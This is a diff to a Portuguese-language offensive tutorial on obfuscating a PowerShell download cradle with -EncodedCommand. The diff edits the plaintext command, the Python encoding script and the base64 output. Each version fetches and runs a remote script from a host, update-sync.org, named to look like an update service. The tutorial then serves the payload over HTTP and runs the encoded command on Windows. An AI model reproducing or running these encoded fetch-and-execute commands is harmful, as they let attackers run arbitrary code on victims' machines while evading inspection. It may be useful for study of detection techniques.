@@ -34,7 +34,7 @@ nano encode-command.py
 
 Comando a ser incluido
 ```
-powershell (New-Object System.Net.WebClient).DownloadString('http://update-sync.org/enc.ps1')|IEX
+(New-Object System.Net.WebClient).DownloadString('http://update-sync.org/enc.ps1')|IEX
 ```
 
 Resultado final do script
@@ -53,7 +53,7 @@ def gerar_comando_encodado(comando_ps):
 
 # Insira seu comando PowerShell aqui
 #comando = 'Get-Process | Where-Object {$_.CPU -gt 100}'
-comando = "powershell (New-Object System.Net.WebClient).DownloadString('http://update-sync.org/enc.ps1')|IEX"
+comando = "(New-Object System.Net.WebClient).DownloadString('http://update-sync.org/enc.ps1')|IEX"
 
 # Exibe o comando encodado completo
 print("Comando PowerShell Encodado:")
@@ -69,7 +69,7 @@ Resultado do script
 ```
 $ python encode-command.py                                                                        
 Comando PowerShell Encodado:
-powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAG8AcgBnAC8AZQBuAGMALgBwAHMAMQAnACkAfABJAEUAWAA=
+powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcALwBlAG4AYwAuAHAAcwAxACcAKQB8AEkARQBYAA==
 ```
 
 Payload a ser executado: whoami
@@ -84,5 +84,5 @@ python -m http.server 80
 
 Executando o comando encodade no Windows
 ```
-powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAG8AcgBnAC8AZQBuAGMALgBwAHMAMQAnACkAfABJAEUAWAA=
+powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcALwBlAG4AYwAuAHAAcwAxACcAKQB8AEkARQBYAA==
 ```
